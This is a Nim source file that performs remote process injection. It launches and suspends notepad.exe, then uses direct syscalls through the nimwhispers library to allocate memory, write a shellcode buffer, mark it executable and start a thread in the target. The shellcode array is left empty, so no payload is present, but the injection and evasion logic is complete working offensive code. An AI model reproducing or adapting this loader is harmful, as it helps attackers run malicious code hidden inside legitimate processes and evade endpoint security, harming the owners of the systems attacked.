
import osproc
import winim/lean

import nimwhispers

var shellcode: array[295, byte] = [
byte ]

proc example() = 
    var cid: CLIENT_ID
    var oa: OBJECT_ATTRIBUTES
    var pHandle: HANDLE
    var tHandle: HANDLE
    var sc_size: SIZE_T = cast[SIZE_T](shellcode.len)
    var ds: LPVOID
    
    let tProcess = startProcess("notepad.exe")
    tProcess.suspend()
    defer: tProcess.close()

    cid.UniqueProcess = tProcess.processID
    echo "[*] Target Process: ", tProcess.processID

    var status = NtOpenProcess(
        &pHandle,
        PROCESS_ALL_ACCESS, 
        &oa, 
        &cid
    )

    echo "[*] status syscall NtOpenProcess: ", status
    echo "[*] pHandle: ", pHandle

    status = NtAllocateVirtualMemory(
        pHandle, 
        &ds, 
        0, 
        &sc_size,
        MEM_COMMIT, 
        PAGE_READWRITE
    )

    echo "[*] status syscall NtAllocateVirtualMemory: ", status
    var bytesWritten: SIZE_T

    status = NtWriteVirtualMemory(
        pHandle, 
        ds, 
        unsafeAddr shellcode, 
        sc_size-1, 
        &bytesWritten
    )

    echo "[*] status syscall NtWriteVirtualMemory: ", status
    var oldprot: ULONG

    status = NtProtectVirtualMemory(
        pHandle, 
        &ds, 
        &sc_size,
        PAGE_EXECUTE_READ,
        &oldprot
    )

    echo "[*] status syscall NtProtectVirtualMemory: ", status

    status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        NULL, 
        pHandle,
        ds, 
        NULL, 
        FALSE,
        0, 
        0, 
        0, 
        NULL
    )
 
    echo "[*] status syscall NtCreateThreadEx: ", status

    status = NtClose(tHandle)
    status = NtClose(pHandle)

    echo "[*] tHandle: ", tHandle
    echo "[+] Injected"

when isMainModule:
    example()